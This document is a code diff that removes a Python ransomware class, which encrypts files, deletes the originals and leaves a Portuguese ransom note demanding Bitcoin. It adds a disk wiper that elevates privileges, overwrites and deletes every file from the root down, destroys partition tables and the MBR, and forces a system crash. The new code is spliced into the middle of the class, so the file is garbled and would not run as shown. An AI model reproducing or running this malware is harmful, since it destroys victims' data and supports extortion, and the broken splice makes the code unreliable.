@@ -35,77 +35,151 @@ BANNER = """
 """
 
 class WhatsAppRansomware:
-    def __init__(self):
-        self.id = self.generate_victim_id()
-        self.key = get_random_bytes(32)  
-        self.iv = get_random_bytes(16)  
-        self.ransom_amount = 0.1 
-        self.bitcoin_address = "1HackerWalletXXXXXX"
-        self.email = "decrypt@protonmail.com"
-        self.target_extensions = [
-            '.txt', '.pdf', '.jpg', '.jpeg', '.png', 
-            '.mp3', '.mp4', '.doc', '.docx', '.xls',
-            '.xlsx', '.ppt', '.pptx', '.zip', '.rar',
-            '.html', '.htm', '.sql', '.db', '.apk'
-        ]
-        self.exclude_dirs = [
-            'bin', 'lib', 'usr', 'sys', 'proc',
-            'dev', 'system', 'vendor', 'etc'
-        ]
-    
-    def generate_victim_id(self):
-       
-        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-    
-    def encrypt_file(self, file_path):
-        """Criptografa um arquivo usando AES-256-CBC"""
-        try:
-        
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            
-        
-            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
-            encrypted_data = cipher.encrypt(pad(data, AES.block_size))
-            
-         
-            with open(file_path + '.locked', 'wb') as f:
-                f.write(encrypted_data)
-            
-          
-            os.remove(file_path)
-            return True
-            
-        except Exception as e:
-            console.print(f"[red]Erro ao criptografar {file_path}: {str(e)}[/red]")
-            return False
-    
-    def generate_ransom_note(self, path):
-    
-        note = f"""
-        ⚠️⚠️⚠️ SEUS ARQUIVOS DO WHATSAPP FORAM CRIPTOGRAFADOS! ⚠️⚠️⚠️
+  import os
+import random
+import sys
+import ctypes
+import platform
+import time
+import threading
 
-        ID da Vítima: {self.id}
-        
-        Para recuperar seus arquivos, você deve:
-        
-        1. Enviar {self.ransom_amount} BTC para: {self.bitcoin_address}
-        2. Enviar seu ID para: {self.email}
-        3. Aguardar a chave de descriptografia
-        
-        ⚠️ Você tem 72 horas para pagar ou perderá todos os dados!
-        ⚠️ Não tente desligar o dispositivo!
-        
-        ---------------------------------------------------
-       
-        """
-        
+def elevate_privileges():
+    if platform.system() == 'Windows':
         try:
-            with open(os.path.join(path, 'LEIA_ISSO.txt'), 'w', encoding='utf-8') as f:
-                f.write(note)
-        except Exception as e:
-            console.print(f"[red]Erro ao gerar nota de resgate: {str(e)}[/red]")
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+            sys.exit(0)
+        except:
+            pass
+    elif os.getuid() != 0:
+        try:
+            os.execvp('sudo', ['sudo', 'python3'] + sys.argv)
+            sys.exit(0)
+        except:
+            pass
+
+def secure_overwrite(path, passes=3):
+    try:
+        file_size = os.path.getsize(path)
+        with open(path, 'wb') as f:
+            for _ in range(passes):
+                f.seek(0)
+                # First pass: random data
+                f.write(os.urandom(file_size))
+                f.flush()
+                os.fsync(f.fileno())
+                # Second pass: zeros
+                f.seek(0)
+                f.write(b'\x00' * file_size)
+                f.flush()
+                os.fsync(f.fileno())
+                # Third pass: ones
+                f.seek(0)
+                f.write(b'\xFF' * file_size)
+                f.flush()
+                os.fsync(f.fileno())
+        os.rename(path, path + '.wiped')
+        os.remove(path + '.wiped')
+    except:
+        pass
+
+def wipe_partition_table():
+    try:
+        if platform.system() == 'Linux':
+            devices = ['/dev/sda', '/dev/sdb', '/dev/nvme0n1', '/dev/vda']
+            for dev in devices:
+                try:
+                    with open(dev, 'wb') as f:
+                        f.write(os.urandom(1024 * 1024))  # Wipe first MB
+                except:
+                    pass
+        elif platform.system() == 'Windows':
+            import win32api
+            import win32file
+            drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
+            for drive in drives:
+                try:
+                    handle = win32file.CreateFile(
+                        r'\\.\%s' % drive.rstrip('\\'),
+                        win32file.GENERIC_WRITE,
+                        win32file.FILE_SHARE_WRITE,
+                        None,
+                        win32file.OPEN_EXISTING,
+                        0,
+                        None
+                    )
+                    win32file.WriteFile(handle, os.urandom(1024 * 1024))
+                    handle.close()
+                except:
+                    pass
+    except:
+        pass
+
+def wipe_system():
+    # Increase priority on Windows
+    if platform.system() == 'Windows':
+        try:
+            ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000100)
+        except:
+            pass
     
+    # Wipe files
+    for root, dirs, files in os.walk('/' if platform.system() != 'Windows' else 'C:\\'):
+        for file in files:
+            try:
+                path = os.path.join(root, file)
+                secure_overwrite(path)
+            except:
+                pass
+    
+    # Wipe directories
+    for root, dirs, _ in os.walk('/' if platform.system() != 'Windows' else 'C:\\', topdown=False):
+        for dir in dirs:
+            try:
+                path = os.path.join(root, dir)
+                os.rmdir(path)
+            except:
+                pass
+    
+    # Additional destructive actions
+    wipe_partition_table()
+    
+    # Wipe MBR (Windows/Linux)
+    try:
+        if platform.system() == 'Linux':
+            with open('/dev/sda', 'wb') as f:
+                f.write(b'\x00' * 512)
+        elif platform.system() == 'Windows':
+            with open(r'\\.\\PhysicalDrive0', 'wb') as f:
+                f.write(b'\x00' * 512)
+    except:
+        pass
+
+if __name__ == '__main__':
+    elevate_privileges()
+    
+    # Start multiple threads for faster destruction
+    threads = []
+    for _ in range(4):
+        t = threading.Thread(target=wipe_system)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    # Also wipe in main thread
+    wipe_system()
+    
+    for t in threads:
+        t.join()
+    
+    # Final destructive act - try to crash the system
+    try:
+        if platform.system() == 'Linux':
+            os.system('echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger')
+        elif platform.system() == 'Windows':
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+    except:
+        pass    
     def scan_and_encrypt(self, start_path):
       
         try:
